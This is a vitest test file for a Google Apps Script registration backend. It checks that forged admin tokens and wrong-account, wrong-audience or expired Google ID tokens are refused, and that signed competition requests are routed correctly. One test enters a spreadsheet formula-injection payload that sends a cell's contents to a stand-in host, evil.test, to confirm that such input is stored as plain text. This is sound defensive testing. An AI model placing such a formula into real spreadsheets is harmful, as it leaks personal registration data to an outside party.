// The existing registration/admin Apps Script (docs/unified-google-apps-script.js), loaded
// together with the competition platform file exactly as they share one Apps Script project.

import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { createAppsScriptRuntime, createStore } from '@/lib/competitions/backend/appsScriptHarness';
import { signEnvelope } from '@/lib/competitions/server/envelope';

const FILES = [
    path.join(process.cwd(), 'docs', 'unified-google-apps-script.js'),
    path.join(process.cwd(), 'google-apps-script', 'competition-platform.js'),
];
const CLIENT_ID = '1234567890-test.apps.googleusercontent.com';
const ADMIN = 'evsociety.org@gmail.com';
const NOW = Date.parse('2026-11-06T09:00:00Z');

const b64url = (value: unknown) => Buffer.from(JSON.stringify(value)).toString('base64url');
// Shaped like a Google ID token; the signature part is irrelevant because Google verifies it
const token = (claims: Record<string, unknown>) => `${b64url({ alg: 'RS256', kid: 'k' })}.${b64url(claims)}.${'s'.repeat(86)}`;
const claims = (overrides: Record<string, unknown> = {}) => ({
    iss: 'https://accounts.google.com',
    aud: CLIENT_ID,
    email: ADMIN,
    email_verified: 'true',
    exp: String(Math.floor(NOW / 1000) + 1800),
    ...overrides,
});

// Header row of the live registrations tab, in the order handleRegistration appends values
const REGISTRATION_HEADERS = ['registrationId', 'type', 'role', 'itemTitle', 'fullName', 'email', 'phone', 'city', 'state', 'organization', 'designation', 'linkedinUrl', 'participationMode', 'consent', 'newsletter', 'guestCategory', 'topic', 'reference', 'specialRequirements', 'skillAreas', 'interestLevel', 'participantType', 'experienceLevel', 'sessionTrack', 'questions', 'timestamp'];

function setup(options: { clientId?: string | null } = {}) {
    const store = createStore();
    store.sheets[0].cells = [REGISTRATION_HEADERS];
    if (options.clientId !== null) store.properties.ADMIN_OAUTH_CLIENT_ID = options.clientId ?? CLIENT_ID;
    let tokenInfoCalls = 0;
    const rt = createAppsScriptRuntime(store, {
        quiet: true,
        effectiveUser: ADMIN,
        now: () => NOW,
        scriptPaths: FILES,
        // Stands in for https://oauth2.googleapis.com/tokeninfo: echoes the claims of tokens
        // made by this test, and rejects anything else as Google would
        fetchHandler: (url) => {
            if (!url.startsWith('https://oauth2.googleapis.com/tokeninfo?id_token=')) return { code: 200, body: '' };
            tokenInfoCalls += 1;
            const idToken = decodeURIComponent(url.split('id_token=')[1]);
            try {
                return { code: 200, body: Buffer.from(idToken.split('.')[1], 'base64url').toString('utf8') };
            } catch {
                return { code: 400, body: '{"error":"invalid_token"}' };
            }
        },
    });
    const post = (data: unknown) => JSON.parse(rt.context.doPost({ postData: { contents: JSON.stringify(data) } }).getContent());
    const register = (fields: Record<string, string>) => post({ registrationId: 'EVS-20261106-12345', type: 'webinars', role: 'attendee', itemTitle: 'Webinar', email: 'visitor@example.com', phone: '+91 98450 12345', consent: true, ...fields });
    const list = (idToken: unknown) => post({ action: 'listRegistrations', filters: {}, idToken });
    return { store, rt, post, register, list, tokenInfoCalls: () => tokenInfoCalls };
}

describe('existing admin endpoint', () => {
    it('refuses the kind of fake token that used to list every registration', () => {
        const s = setup();
        s.register({ fullName: 'Visitor One' });
        for (const fake of ['test-token-12345', 'xxxxx', '', null, 12345, 'a.b.c', 'x'.repeat(500)]) {
            const res = s.list(fake);
            expect(res).toEqual({ ok: false, error: 'Access denied. Invalid token.' });
        }
        expect(JSON.stringify(s.list('test-token-12345'))).not.toContain('visitor@example.com');
    });

    it('lists registrations for a current Google sign-in of the admin account, checking with Google once', () => {
        const s = setup();
        s.register({ fullName: 'Visitor One' });
        const idToken = token(claims());
        const res = s.list(idToken);
        expect(res.ok).toBe(true);
        expect(res.data.map((r: any) => r.email)).toEqual(['visitor@example.com']);
        expect(s.list(idToken).ok).toBe(true);
        expect(s.tokenInfoCalls()).toBe(1);
    });

    it('refuses genuine Google tokens for another account, another app, an unverified email or after expiry', () => {
        const s = setup();
        const cases = {
            otherAccount: claims({ email: 'someone@gmail.com' }),
            sameNameDifferentCase: claims({ email: 'EVSOCIETY.ORG@GMAIL.COM.evil.test' }),
            otherApp: claims({ aud: '999-other.apps.googleusercontent.com' }),
            unverified: claims({ email_verified: 'false' }),
            expired: claims({ exp: String(Math.floor(NOW / 1000) - 10) }),
            wrongIssuer: claims({ iss: 'https://evil.test' }),
        };
        for (const [name, c] of Object.entries(cases)) {
            expect([name, s.list(token(c)).ok]).toEqual([name, false]);
        }
    });

    it('refuses everyone until ADMIN_OAUTH_CLIENT_ID is configured', () => {
        const s = setup({ clientId: null });
        expect(s.list(token(claims())).ok).toBe(false);
        expect(s.tokenInfoCalls()).toBe(0);
    });
});

describe('admin page sign-in expiry', () => {
    it('reads the expiry from a Google ID token so an expired sign-in asks to sign in again', async () => {
        const { getIdTokenExpiry } = await import('@/lib/adminAuth');
        expect(getIdTokenExpiry(token(claims({ exp: 1_800_000_000 })))).toBe(1_800_000_000_000);
        expect(getIdTokenExpiry('not-a-token')).toBeNull();
        expect(getIdTokenExpiry(`a.${Buffer.from('{"exp":"soon"}').toString('base64url')}.c`)).toBeNull();
    });
});

describe('existing public registration', () => {
    it('still appends registrations, storing formula-like input as text', () => {
        const s = setup();
        const res = s.register({ fullName: '=IMPORTXML("https://evil.test/?"&A2,"//a")', city: '@SUM(1)', organization: '-cmd', topic: 'Normal text' });
        expect(res).toEqual({ success: true, registrationId: 'EVS-20261106-12345' });
        const sheet = s.store.sheets.find((x) => x.name === 'EVSociety Registrations')!;
        expect(sheet.formulas).toEqual({});
        const row = sheet.cells[1];
        expect(row[4]).toBe('=IMPORTXML("https://evil.test/?"&A2,"//a")');
        expect(row[6]).toBe('+91 98450 12345');
        expect(row[7]).toBe('@SUM(1)');
        expect(row[16]).toBe('Normal text');
    });
});

describe('one Apps Script project', () => {
    it('loads both files without name clashes and routes signed competition requests', () => {
        const s = setup();
        s.store.properties.EVSC_API_SECRET = 'test-api-secret-0123456789abcdef0123456789abcdef';
        s.rt.context.evsCompetitionSetup();
        const envelope = signEnvelope(s.store.properties.EVSC_API_SECRET, { action: 'config.get', params: { competitionId: 'inspace-model-rocketry-cansat' }, ctx: {} }, NOW);
        const res = s.post(envelope);
        expect(res.ok).toBe(true);
        expect(res.data.config.registrationOpen).toBe(true);
        // A competition-shaped request without a valid signature is refused, not treated as a registration
        const forged = s.post({ ...envelope, nonce: 'a'.repeat(32), sig: 'b'.repeat(64) });
        expect(forged.ok).toBe(false);
        expect(s.store.sheets.find((x) => x.name === 'EVSociety Registrations')!.cells).toHaveLength(1);
    });
});
